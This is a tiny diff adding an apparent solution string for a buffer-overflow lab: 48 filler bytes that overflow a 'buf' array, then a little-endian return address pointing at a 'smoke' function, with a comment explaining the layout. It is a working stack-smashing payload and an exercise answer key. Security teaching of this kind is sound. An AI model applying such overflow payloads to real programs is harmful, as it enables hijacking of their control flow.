@@ -1,0 +1,2 @@
+ffffffffffffffffffffffffffffffffffffffffffffffff24890408
+#first 48 are buffer bytes to fill the buf array, then the return address of smoke(in little endian)
